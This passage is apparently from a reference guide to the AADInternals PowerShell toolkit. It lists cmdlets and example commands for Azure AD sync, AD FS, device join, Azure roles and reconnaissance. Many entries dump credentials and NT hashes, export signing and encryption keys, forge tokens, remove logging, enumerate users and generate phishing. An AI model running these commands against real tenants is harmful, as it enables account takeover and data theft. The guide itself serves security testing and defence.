Get-AADIntAccessTokenForPTA -SaveToCache
Register-AADIntPTAAgent
```

### Register-AADIntSyncAgent (P)
Registers Azure AD Connect cloud provisioning agent.

```powershell
Get-AADIntAccessTokenForPTA -SaveToCache
Register-AADIntSyncAgent
```

### Set-AADIntPTACertificate (Endpoints)
Replaces PTA agent authentication certificate. Maintains persistent access through certificate substitution.

```powershell
Set-AADIntPTACertificate
```

### Get-AADIntProxyAgents (P)
Lists registered PTA and provisioning agents.

```powershell
Get-AADIntAccessTokenForPTA -SaveToCache
Get-AADIntProxyAgents
```

### Get-AADIntProxyAgentGroups (P)
Retrieves groupings of proxy agents.

```powershell
Get-AADIntAccessTokenForPTA -SaveToCache
Get-AADIntProxyAgentGroups
```

### Export-AADIntProxyAgentCertificates (Endpoints)
Extracts PTA agent authentication certificates for offline use.

```powershell
Export-AADIntProxyAgentCertificates
```

### Export-AADIntProxyAgentBootstraps (Endpoints)
Extracts bootstrap certificates for agent provisioning.

```powershell
Export-AADIntProxyAgentBootstraps
```

---

## 15. Directory Synchronization Hack Functions

### Set-AADIntPasswordHashSyncEnabled (A)
Enables or disables password hash synchronization.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Enabled` | Boolean | Yes | $true to enable, $false to disable |

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntPasswordHashSyncEnabled -Enabled $true
```

### New-AADIntGuestInvitation (Z)
Creates guest user invitations within the tenant.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-InvitedUserEmailAddress` | String | Yes | Guest email address |

```powershell
New-AADIntGuestInvitation -InvitedUserEmailAddress "guest@external.com"
```

### Get-AADIntSyncCredentials (Endpoints)
Extracts Azure AD Connect synchronization service account credentials. Uses background process (doesn't elevate current PS session). Supports external SQLExpress database.

```powershell
Get-AADIntSyncCredentials
```

### Update-AADIntSyncCredentials (Endpoints)
Updates Azure AD Connect sync service account credentials.

```powershell
Update-AADIntSyncCredentials -NewPassword "NewPassword123"
```

### Get-AADIntSyncEncryptionKeyInfo (Endpoints)
Retrieves metadata about sync encryption keys without decrypting.

```powershell
Get-AADIntSyncEncryptionKeyInfo
```

### Get-AADIntSyncEncryptionKey (Endpoints)
Exports encryption keys used by Azure AD Connect for credential protection.

```powershell
Get-AADIntSyncEncryptionKey
```

### Get-AADIntUserNTHash
Dumps NT hashes directly from Azure AD user objects.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntUserNTHash -UserPrincipalName "user@company.com"
```

### Install-AADIntForceNTHash (Endpoints)
Forces NT hash synchronization to Azure AD, enabling legacy authentication methods.

```powershell
Install-AADIntForceNTHash
```

### Remove-AADIntForceNTHash (Endpoints)
Disables forced NT hash synchronization.

```powershell
Remove-AADIntForceNTHash
```

### Initialize-AADIntFullPasswordSync (Endpoints)
Initiates a complete password synchronization cycle across all users.

```powershell
Initialize-AADIntFullPasswordSync
```

---

## 16. ADFS Hack Functions

### New-AADIntADFSSelfSignedCertificates (Endpoints)
Creates self-signed certificates for AD FS token signing operations.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServerName` | String | No | Target AD FS server |

```powershell
New-AADIntADFSSelfSignedCertificates -ServerName "adfs.company.com"
```

### Restore-AADIntADFSAutoRollover (Endpoints)
Restores automatic certificate rollover functionality in AD FS.

```powershell
Restore-AADIntADFSAutoRollover -ServerName "adfs.company.com"
```

### Update-AADIntADFSFederationSettings (A)
Modifies AD FS federation settings synchronized with Azure AD.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Update-AADIntADFSFederationSettings -Domain "company.com"
```

### Export-AADIntADFSCertificates (Endpoints)
Exports AD FS certificates including custom certificates not stored in config DB. Uses service running as AD FS service account for local export.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServerName` | String | No | Target AD FS server |
| `-Credential` | PSCredential | No | Service account credentials |

```powershell
Export-AADIntADFSCertificates -ServerName "adfs.company.com"
```

### Export-AADIntADFSConfiguration (Endpoints)
Extracts complete AD FS configuration including policies and trust relationships.

```powershell
Export-AADIntADFSConfiguration -ServerName "adfs.company.com"
```

### Export-AADIntADFSEncryptionKey (Endpoints)
Retrieves AD FS Data Encryption Key (DKM) from Active Directory.

```powershell
Export-AADIntADFSEncryptionKey
```

### Set-AADIntADFSConfiguration (Endpoints)
Applies modified AD FS configuration back to the server.

```powershell
$config = Export-AADIntADFSConfiguration
Set-AADIntADFSConfiguration -Configuration $config -ServerName "adfs.company.com"
```

### Get-AADIntADFSPolicyStoreRules (Endpoints)
Retrieves authorization rules from AD FS policy store.

```powershell
Get-AADIntADFSPolicyStoreRules -ServerName "adfs.company.com"
```

### Set-AADIntADFSPolicyStoreRules (Endpoints)
Modifies AD FS policy store authorization rules.

```powershell
Set-AADIntADFSPolicyStoreRules -Rules $updatedRules -ServerName "adfs.company.com"
```

### New-AADIntADFSRefreshToken (*)
Generates valid AD FS refresh tokens for extended session access.

```powershell
New-AADIntADFSRefreshToken -UserPrincipalName "user@company.com" -Issuer "https://adfs.company.com"
```

### Unprotect-AADIntADFSRefreshToken (*)
Decodes and validates AD FS refresh tokens to extract claims.

```powershell
$token = New-AADIntADFSRefreshToken -UserPrincipalName "user@company.com"
Unprotect-AADIntADFSRefreshToken -RefreshToken $token
```

---

## 17. Seamless Single-Sign-On (DesktopSSO) Hack Functions

### Get-AADIntDesktopSSO (P)
Retrieves Kerberos computer account credentials for Seamless SSO configuration.

```powershell
Get-AADIntAccessTokenForPTA -SaveToCache
Get-AADIntDesktopSSO
```

### Set-AADIntDesktopSSOEnabled (P)
Enables or disables Desktop SSO (Seamless Single-Sign-On) feature.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Enabled` | Boolean | Yes | $true to enable, $false to disable |

```powershell
Set-AADIntDesktopSSOEnabled -Enabled $true
```

### Set-AADIntDesktopSSO (P)
Configures Desktop SSO with Kerberos account credentials.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-KerberosAccount` | String | Yes | Computer account for SSO |
| `-KerberosPassword` | SecureString | Yes | Account password |

```powershell
$password = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
Set-AADIntDesktopSSO -KerberosAccount "AZUREADSSOACC$" -KerberosPassword $password
```

### New-AADIntKerberosTicket
Generates Kerberos service tickets for SSO operations.

```powershell
New-AADIntKerberosTicket -UserPrincipalName "user@company.com" -ServicePrincipalName "HTTP/server.company.com"
```

---

## 18. Active Directory Hack Functions

### Get-AADIntDPAPIKeys (Endpoints)
Extracts Data Protection API (DPAPI) encryption keys from local system.

```powershell
Get-AADIntDPAPIKeys
```

### Get-AADIntLSASecrets (Endpoints)
Retrieves cached credentials and secrets from Local Security Authority (LSA). Supports gMSA and account lookup.

```powershell
Get-AADIntLSASecrets
```

### Get-AADIntLSABackupKeys (Endpoints)
Extracts LSA backup keys used for DPAPI decryption recovery.

```powershell
Get-AADIntLSABackupKeys
```

### Get-AADIntSystemMasterKeys (Endpoints)
Retrieves system-level master encryption keys for credential recovery.

```powershell
Get-AADIntSystemMasterKeys
```

### Get-AADIntUserMasterKeys (*)
Obtains user-specific DPAPI master keys for decrypting user-level secrets.

```powershell
Get-AADIntUserMasterKeys -UserName "domain\username"
```

### Get-AADIntLocalUserCredentials (Endpoints)
Dumps credentials stored in LSA for local user accounts.

```powershell
Get-AADIntLocalUserCredentials
```

---

## 19. Azure AD Join, MDM & PRT Hack Functions

### Get-AADIntUserPRTToken (Endpoints)
Retrieves Primary Refresh Token for the current user. Requires local system access.

```powershell
Get-AADIntUserPRTToken
```

### Join-AADIntOnPremDeviceToAzureAD (A)
Hybrid join: integrates on-premises devices into Azure AD via federation.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Join-AADIntOnPremDeviceToAzureAD
```

### Join-AADIntDeviceToAzureAD (J)
Registers device with Azure AD. Supports device code authentication. Returns device certificate and transport key.

```powershell
Get-AADIntAccessTokenForAADJoin -SaveToCache
Join-AADIntDeviceToAzureAD
```

### Get-AADIntUserPRTKeys
Extracts PRT Session keys from the device.

```powershell
Get-AADIntUserPRTKeys
```

### Get-AADIntUserPRTKeysFromCloudAP (Endpoints, v0.9.6)
Retrieves PRT keys specifically from CloudAP component.

```powershell
Get-AADIntUserPRTKeysFromCloudAP
```

### New-AADIntUserPRTToken (*)
Creates new PRT tokens. Supports -GetNonce switch. Can use cached refresh tokens.

```powershell
New-AADIntUserPRTToken
New-AADIntUserPRTToken -GetNonce
```

### New-AADIntBulkPRTToken (A, v0.4.5)
Generates PRT tokens in bulk for multiple devices.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
New-AADIntBulkPRTToken
```

### New-AADIntP2PDeviceCertificate (*)
Creates peer-to-peer device certificates for device-to-device communication.

```powershell
New-AADIntP2PDeviceCertificate
```

### Join-AADIntDeviceToIntuneMDM (M)
Enrolls device in Intune MDM.

```powershell
Get-AADIntAccessTokenForIntuneMDM -SaveToCache
Join-AADIntDeviceToIntuneMDM
```

### Start-AADIntDeviceIntuneCallback (*)
Initiates MDM callback mechanism. Local system function.

```powershell
Start-AADIntDeviceIntuneCallback
```

### Get-AADIntDeviceRegAuthMethods (A)
Lists device registration authentication methods.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntDeviceRegAuthMethods
```

### Set-AADIntDeviceRegAuthMethods (A)
Configures device registration authentication methods.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntDeviceRegAuthMethods
```

### Get-AADIntDeviceTransportKey (A)
Retrieves device transport key.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntDeviceTransportKey
```

### Set-AADIntDeviceTransportKey (A)
Sets device transport key.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntDeviceTransportKey
```

### Get-AADIntDeviceCompliance (A)
Retrieves device compliance status.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntDeviceCompliance
```

### Set-AADIntDeviceCompliant (A)
Marks device as compliant.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntDeviceCompliant
```

### Export-AADIntLocalDeviceCertificate (Endpoints)
Exports device certificate from local system.

```powershell
Export-AADIntLocalDeviceCertificate
```

### Export-AADIntLocalDeviceTransportKey (Endpoints)
Extracts device transport keys from local system.

```powershell
Export-AADIntLocalDeviceTransportKey
```

### Export-AADIntLocalDeviceMDMCertificate (Endpoints, v0.9.6)
Exports Intune MDM certificate from local system.

```powershell
Export-AADIntLocalDeviceMDMCertificate
```

### Join-AADIntLocalDeviceToAzureAD (Endpoints)
Configures local device using exported certificates.

```powershell
Join-AADIntLocalDeviceToAzureAD
```

### Get-AADIntLocalDeviceJoinInfo (Endpoints)
Retrieves local device join information.

```powershell
Get-AADIntLocalDeviceJoinInfo
```

### Add-AADIntSyncFabricServicePrincipal (A)
Adds Sync Fabric service principal.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Add-AADIntSyncFabricServicePrincipal
```

### Invoke-AADIntScriptAs (Endpoints, v0.9.6)
Runs PowerShell scripts as SYSTEM or other users.

```powershell
Invoke-AADIntScriptAs
```

### Remove-AADIntServices (Endpoints)
Removes Windows services.

```powershell
Remove-AADIntServices
```

---

## 20. Client Functions

### Get-AADIntOfficeUpdateBranch (Endpoints)
Retrieves Office update channel configuration from local system.

```powershell
Get-AADIntOfficeUpdateBranch
```

### Set-AADIntOfficeUpdateBranch (Endpoints)
Modifies Office update channel on local computer.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Branch` | String | Yes | Update channel (Current, SemiAnnual, etc.) |

```powershell
Set-AADIntOfficeUpdateBranch -Branch "SemiAnnual"
```

---

## 21. Support and Recovery Assistant (SARA)

### Test-AADIntSARAPort
Validates SARA service port connectivity.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Hostname` | String | Yes | SARA server address |
| `-Port` | Int | No | Port number (default: 443) |

```powershell
Test-AADIntSARAPort -Hostname "outlook.office.com"
```

### Resolve-AADIntSARAHost
Resolves SARA server hostname to IP address.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Hostname` | String | Yes | Server name to resolve |

```powershell
Resolve-AADIntSARAHost -Hostname "outlook.office.com"
```

### Get-AADIntSARAUserInfo
Retrieves user information via SARA service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-UserEmail` | String | Yes | Target user email address |

```powershell
Get-AADIntAccessTokenForSARA -SaveToCache
Get-AADIntSARAUserInfo -UserEmail "user@company.com"
```

### Get-AADIntSARATenantInfo
Fetches tenant information through SARA service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-TenantId` | String | Yes | Azure AD tenant identifier |

```powershell
Get-AADIntAccessTokenForSARA -SaveToCache
Get-AADIntSARATenantInfo -TenantId "..."
```

---

## 22. Azure Functions

### Grant-AADIntAzureUserAccessAdminRole (AC)
Elevates user to User Access Administrator role across all Azure subscriptions.

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Grant-AADIntAzureUserAccessAdminRole
```

### Get-AADIntAzureSubscriptions (AC)
Retrieves Azure subscriptions associated with the tenant.

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureSubscriptions
```

### Set-AADIntAzureRoleAssignment (AC)
Configures role assignments within Azure subscriptions.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-RoleId` | String | Yes | Role to assign |
| `-PrincipalId` | String | Yes | User/SP receiving role |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Set-AADIntAzureRoleAssignment -SubscriptionId "..." -RoleId "..." -PrincipalId "..."
```

### Get-AADIntAzureClassicAdministrators (AC)
Lists classic subscription administrators.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureClassicAdministrators -SubscriptionId "..."
```

### Get-AADIntAzureResourceGroups (AC)
Enumerates resource groups within subscriptions.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureResourceGroups -SubscriptionId "..."
```

### Get-AADIntAzureVMs (AC)
Lists virtual machines in Azure subscriptions.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | No | Filter by resource group |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureVMs -SubscriptionId "..."
```

### Invoke-AADIntAzureVMScript (AC)
Executes PowerShell scripts on Azure virtual machines.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | VM resource group |
| `-VmName` | String | Yes | Virtual machine name |
| `-ScriptBlock` | ScriptBlock | Yes | PowerShell code to execute |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Invoke-AADIntAzureVMScript -SubscriptionId "..." -ResourceGroup "rg" -VmName "vm1" -ScriptBlock {hostname}
```

### Get-AADIntAzureVMRdpSettings (AC)
Retrieves RDP configuration for Azure VMs.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | VM resource group |
| `-VmName` | String | Yes | Virtual machine name |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureVMRdpSettings -SubscriptionId "..." -ResourceGroup "rg" -VmName "vm1"
```

### Get-AADIntAzureTenants (AC)
Lists accessible Azure tenants.

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureTenants
```

### Get-AADIntAzureInformation (AC)
Provides comprehensive Azure tenant and subscription information.

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureInformation
```

### Get-AADIntAzureSignInLog (M)
Retrieves sign-in activity logs from Azure.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Days` | Int | No | Number of days to retrieve (default: 1) |

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAzureSignInLog -Days 30
```

### Get-AADIntAzureAuditLog (M)
Fetches audit logs from Azure AD.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Days` | Int | No | Lookback period in days |

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAzureAuditLog -Days 7
```

### Remove-AADIntAzureDiagnosticSettings (AC)
Deletes diagnostic settings from Azure resources.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | Resource group name |
| `-ResourceName` | String | Yes | Resource identifier |
| `-SettingName` | String | Yes | Diagnostic setting to remove |

### Get-AADIntAzureDiagnosticSettings (AC)
Lists diagnostic settings configured for Azure resources.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | Resource group name |
| `-ResourceName` | String | Yes | Resource identifier |

### Get-AADIntAzureDiagnosticSettingsDetails (AC)
Provides detailed diagnostic settings configuration.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | Resource group name |
| `-ResourceName` | String | Yes | Resource identifier |
| `-SettingName` | String | Yes | Specific diagnostic setting |

### Set-AADIntAzureDiagnosticSettingsDetails (AC)
Modifies diagnostic settings for Azure resources.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-SubscriptionId` | String | Yes | Target subscription |
| `-ResourceGroup` | String | Yes | Resource group name |
| `-ResourceName` | String | Yes | Resource identifier |
| `-Configuration` | Hashtable | Yes | Settings configuration |

### Get-AADIntAzureDirectoryActivityLog (AC)
Retrieves Azure AD directory activity audit logs.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Days` | Int | No | Historical lookback period |

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntAzureDirectoryActivityLog -Days 7
```

### Get-AADIntAzureWireServerAddress (Endpoints)
Retrieves Azure IMDS wire server IP address for instance metadata access.

```powershell
Get-AADIntAzureWireServerAddress
```

---

## 23. Hybrid Health Functions

### New-AADIntHybridHealthService (AC)
Creates a new Hybrid Health service registration.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceName` | String | Yes | Health service identifier |
| `-ServiceType` | String | Yes | Type: AD FS, Sync, PTA |

### Get-AADIntHybridHealthServices (AC)
Lists registered Hybrid Health services.

```powershell
Get-AADIntAccessTokenForAzureCoreManagemnt -SaveToCache
Get-AADIntHybridHealthServices
```

### Remove-AADIntHybridHealthService (AC)
Deletes a Hybrid Health service registration.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Service identifier to remove |

### New-AADIntHybridHealthServiceMember (AC)
Registers a server as member of Hybrid Health service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Target health service |
| `-ServerName` | String | Yes | Server hostname |
| `-Certificate` | X509Certificate2 | Yes | Server auth certificate |

### Get-AADIntHybridHealthServiceMembers (AC)
Enumerates servers registered with Hybrid Health services.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Target health service |

### Remove-AADIntHybridHealthServiceMember (AC)
Unregisters a server from Hybrid Health service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Target health service |
| `-MemberId` | String | Yes | Member to remove |

### Get-AADIntHybridHealthServiceMonitoringPolicies (AC)
Retrieves monitoring policies for Hybrid Health services.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Target health service |

### Get-AADIntHybridHealthServiceAgentInfo (Endpoints)
Extracts Hybrid Health agent information from local configuration.

```powershell
Get-AADIntHybridHealthServiceAgentInfo
```

### Send-AADIntHybridHealthServiceEvents
Transmits health events to Hybrid Health service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ServiceId` | String | Yes | Target health service |
| `-Events` | Object[] | Yes | Event data array |

### New-AADIntHybridHealtServiceEvent (AC)
Constructs Hybrid Health event object for transmission.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-EventType` | String | Yes | Category of health event |
| `-Timestamp` | DateTime | Yes | Event occurrence time |
| `-Details` | Hashtable | No | Event metadata |

### Register-AADIntHybridHealthServiceAgent (AC)
Registers Hybrid Health agent with Azure AD.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-AgentKey` | String | Yes | Agent authentication key |
| `-Certificate` | X509Certificate2 | Yes | Agent certificate |

---

## 24. Kill Chain Functions

### Invoke-AADIntReconAsOutsider (*)
Performs reconnaissance on target tenant without authentication.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Target domain name |
| `-GetRelayingParties` | Switch | No | Extract AD FS relying parties |
| `-Instance` | String | No | Cloud instance (default: Worldwide) |

```powershell
Invoke-AADIntReconAsOutsider -Domain company.com
Invoke-AADIntReconAsOutsider -Domain company.com -GetRelayingParties
```

### Invoke-AADIntUserEnumerationAsOutsider (*)
Validates user existence in target tenant without authentication.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Target domain name |
| `-Users` | String[] | Yes | Usernames to enumerate |
| `-Method` | String | No | Enumeration technique |

```powershell
$users = @("admin", "user1", "user2")
Invoke-AADIntUserEnumerationAsOutsider -Domain company.com -Users $users
```

### Invoke-AADIntReconAsGuest (AC)
Gathers tenant information using guest user access.

```powershell
$token = Get-AADIntAccessTokenForAADGraph
Invoke-AADIntReconAsGuest -AccessToken $token
```

### Invoke-AADIntUserEnumerationAsGuest (AC)
Enumerates users within tenant using guest credentials.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Users` | String[] | Yes | User list to validate |

### Invoke-AADIntReconAsInsider (AC)
Performs comprehensive reconnaissance with authenticated access.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Invoke-AADIntReconAsInsider
```

### Invoke-AADIntUserEnumerationAsInsider (AC)
Validates user existence using authenticated tenant access.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Users` | String[] | Yes | Usernames to validate |

### Invoke-AADIntPhishing (*)
Generates phishing content for social engineering campaigns.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-TargetUser` | String | Yes | Recipient email address |
| `-Template` | String | No | Phishing template type |

---

## 25. DRS Functions

### Get-AADIntAdUserNTHash (Endpoints)
Extracts NT hash of AD user via Directory Replication Service.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-UserName` | String | Yes | Target AD username |
| `-Domain` | String | Yes | Active Directory domain |

```powershell
Get-AADIntAdUserNTHash -UserName "user1" -Domain "company.com"
```

### Get-AADIntADUserThumbnailPhoto (Endpoints)
Retrieves user thumbnail photo from Active Directory via DRS.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-UserName` | String | Yes | Target AD username |
| `-Domain` | String | Yes | Active Directory domain |

```powershell
Get-AADIntADUserThumbnailPhoto -UserName "user1" -Domain "company.com" | Out-File photo.jpg
```

### Get-AADIntDesktopSSOAccountPassword (Endpoints)
Extracts Seamless SSO computer account password from Active Directory.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Active Directory domain name |

```powershell
Get-AADIntDesktopSSOAccountPassword -Domain "company.com"
```

---

## 26. MS Partner Functions

### New-AADIntMSPartnerDelegatedAdminRequest (*)
Creates delegated administration request for Microsoft partners.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-PartnerTenantId` | String | Yes | Partner organization ID |
| `-AdminRoles` | String[] | Yes | Requested admin roles |

```powershell
$roles = @("Global Administrator", "User Administrator")
New-AADIntMSPartnerDelegatedAdminRequest -PartnerTenantId "..." -AdminRoles $roles
```

### Approve-AADIntMSPartnerDelegatedAdminRequest (AD)
Authorizes pending partner delegation requests.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-RequestId` | String | Yes | Pending request identifier |

### Remove-AADIntMSPartnerDelegatedAdminRoles (AD)
Revokes partner delegated administration access.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-PartnerTenantId` | String | Yes | Partner organization ID |

### Get-AADIntMSPartners (AD)
Lists Microsoft partners with tenant access.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntMSPartners
```

### Get-AADIntMSPartnerOrganizations (MP)
Retrieves partner organization details.

### Get-AADIntMSPartnerRoleMembers (MP)
Enumerates users assigned partner administrative roles.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-RoleId` | String | Yes | Role identifier |

### Get-AADIntMSPartnerContracts (A)
Lists customer contracts managed by partner.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntMSPartnerContracts
```

### Find-AADIntMSPartners (*)
Discovers potential Microsoft partners for organization.

```powershell
Find-AADIntMSPartners
```

---

## 27. OneNote Functions

### Start-AADIntSpeech (ON)
Converts text to speech using OneNote capabilities.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Text` | String | Yes | Content to vocalize |
| `-Language` | String | No | Language code (default: en-US) |
| `-Speed` | Int | No | Speech rate (1-100, default: 50) |

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Start-AADIntSpeech -Text "Welcome to AAD Internals"
```

---

## 28. Certificate Based Authentication (CBA)

### Get-AADIntAdminPortalAccessTokenUsingCBA
Obtains access token for admin portal using certificate authentication.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Certificate` | X509Certificate2 | Yes | Client certificate |
| `-TenantId` | String | Yes | Azure AD tenant ID |

```powershell
$cert = Get-Item Cert:\CurrentUser\My\<thumbprint>
Get-AADIntAdminPortalAccessTokenUsingCBA -Certificate $cert -TenantId "..."
```

### Get-AADIntPortalAccessTokenUsingCBA
Retrieves portal access token via certificate-based authentication.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Certificate` | X509Certificate2 | Yes | Client certificate |
| `-TenantId` | String | Yes | Azure AD tenant ID |
| `-ClientId` | String | No | Application identifier |

```powershell
$cert = Get-Item Cert:\CurrentUser\My\<thumbprint>
Get-AADIntPortalAccessTokenUsingCBA -Certificate $cert -TenantId "..."
```

---

## 29. Access Package Functions

### Get-AADIntAccessPackages (AP)
Lists access packages configured in tenant.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAccessPackages
```

### Get-AADIntAccessPackageCatalogs (AP)
Enumerates access package catalogs.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAccessPackageCatalogs
```

### Get-AADIntAccessPackageAdmins (AP)
Retrieves access package administrator assignments.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntAccessPackageAdmins
```

---

## 30. B2C Functions

### Get-AADIntB2CEncryptionKeys (M)
Extracts B2C token encryption keys from Azure AD.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-B2CTenantId` | String | Yes | B2C tenant identifier |

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntB2CEncryptionKeys -B2CTenantId "..."
```

### New-AADIntB2CRefreshToken
Generates B2C refresh token using exported encryption keys.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-EncryptionKey` | Byte[] | Yes | Decrypted B2C encryption key |
| `-UserId` | String | Yes | Target user identifier |
| `-ClientId` | String | Yes | B2C application identifier |

```powershell
$key = Get-AADIntB2CEncryptionKeys
New-AADIntB2CRefreshToken -EncryptionKey $key -UserId "user@..." -ClientId "..."
```

### New-AADIntB2CAuthorizationCode
Creates B2C authorization code for token exchange.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-EncryptionKey` | Byte[] | Yes | B2C encryption key |
| `-UserId` | String | Yes | Target user identifier |
| `-ClientId` | String | Yes | Application identifier |
| `-RedirectUri` | String | Yes | Callback URL |

```powershell
New-AADIntB2CAuthorizationCode -EncryptionKey $key -UserId "user@..." -ClientId "..." -RedirectUri "https://..."
```

---

## Summary Statistics

| Category | Cmdlet Count |
|----------|-------------|
| Configuration | 5 |
| Access Token Functions | 8 + 12 service wrappers + 3 cache mgmt |
| Tenant Information | 38 |
| Rollout Policy | 6 |
| Utilities | 6 |
| User Manipulation | 6 |
| User MFA Manipulation | 8 |
| User Manipulation (AD Sync) | 6 |
| Exchange Online | 7 |
| SharePoint Online | 7 |
| OneDrive for Business | 3 |
| Teams | 13 |
| Identity Federation Hack | 4 |
| PTA Hack | 11 |
| Directory Sync Hack | 10 |
| ADFS Hack | 11 |
| Seamless SSO Hack | 4 |
| Active Directory Hack | 6 |
| Azure AD Join/MDM/PRT Hack | 24 |
| Client Functions | 2 |
| SARA | 4 |
| Azure Functions | 18 |
| Hybrid Health | 11 |
| Kill Chain | 7 |
| DRS | 3 |
| MS Partner | 8 |
| OneNote | 1 |
| CBA | 2 |
| Access Packages | 3 |
| B2C | 3 |
| **TOTAL** | **~246** |
